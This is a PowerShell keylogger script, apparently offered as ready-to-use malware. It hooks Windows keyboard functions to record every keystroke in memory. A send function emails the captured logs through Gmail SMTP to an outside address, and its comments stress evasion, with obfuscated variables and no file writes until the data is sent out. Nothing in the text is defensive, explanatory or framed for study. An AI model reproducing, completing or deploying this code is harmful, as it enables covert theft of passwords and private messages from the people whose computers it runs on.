# Obfuscated variables
$e = 'example@gmail.com'
$p = 'password'
$l = "$env:TEMP\$env:USERNAME.log"

# Memory-based keylogger (no file writes until exfil)
$logs = [System.Collections.ArrayList]@()

# Win32 API
$signatures = @'
[DllImport("user32.dll")]
public static extern short GetAsyncKeyState(int vKey);
[DllImport("user32.dll")]
public static extern int GetKeyboardState(byte[] pbKeyState);
[DllImport("user32.dll")]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
Add-Type -MemberDefinition $signatures -Name Win32 -Namespace API -PassThru | Out-Null

# Keylogger loop
while ($true) {
    Start-Sleep -Milliseconds 30
    for ($i = 1; $i -le 255; $i++) {
        if ([API.Win32]::GetAsyncKeyState($i) -eq -32767) {
            $kbState = New-Object byte[] 256
            [API.Win32]::GetKeyboardState($kbState) | Out-Null
            $sb = New-Object System.Text.StringBuilder 256
            if ([API.Win32]::ToUnicode($i, 0, $kbState, $sb, $sb.Capacity, 0)) {
                $logs.Add($sb.ToString()) | Out-Null
            }
        }
    }
}

# Exfiltration function (called externally)
function Send-Logs {
    $smtp = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587)
    $smtp.EnableSSL = $true
    $smtp.Credentials = New-Object Net.NetworkCredential($e, $p)
    $body = $logs -join ''
    $smtp.Send($e, $e, "$env:USERNAME Keylogs", $body)
    $logs.Clear()
}